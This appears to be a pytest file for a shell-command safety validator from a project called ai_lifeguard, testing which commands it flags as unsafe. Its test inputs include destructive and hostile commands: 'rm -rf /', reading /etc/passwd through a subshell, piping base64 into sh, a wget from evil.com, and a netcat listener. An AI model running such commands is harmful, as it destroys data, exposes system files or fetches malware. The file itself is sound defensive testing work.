from ai_lifeguard.command_validator import check_command


def test_safe_command():
    r = check_command("ls -la")
    assert r.safe


def test_rm_rf():
    r = check_command("rm -rf /")
    assert not r.safe
    assert r.level == "critical"


def test_sudo():
    r = check_command("sudo apt install something")
    assert not r.safe
    assert r.level == "high"


def test_chmod_777():
    r = check_command("chmod 777 /var/www")
    assert not r.safe


def test_git_force_push():
    r = check_command("git push origin main --force")
    assert not r.safe


def test_subshell_injection():
    r = check_command("echo $(cat /etc/passwd)")
    assert not r.safe


def test_base64_decode():
    r = check_command("echo payload | base64 -d | sh")
    assert not r.safe


def test_chaining_with_danger():
    r = check_command("echo hello; rm -rf /")
    assert not r.safe
    assert r.level == "critical"


def test_chaining_safe():
    r = check_command("echo hello; echo world")
    assert r.safe


def test_python_exec():
    r = check_command("python -c 'import os; os.system(\"rm -rf /\")'")
    assert not r.safe


def test_wget():
    r = check_command("wget http://evil.com/malware.sh")
    assert not r.safe


def test_netcat():
    r = check_command("nc -l 4444")
    assert not r.safe


def test_allowlist():
    r = check_command("npm install", allowed_commands=["git", "ls"])
    assert not r.safe
    assert "allowlist" in r.matched_rule
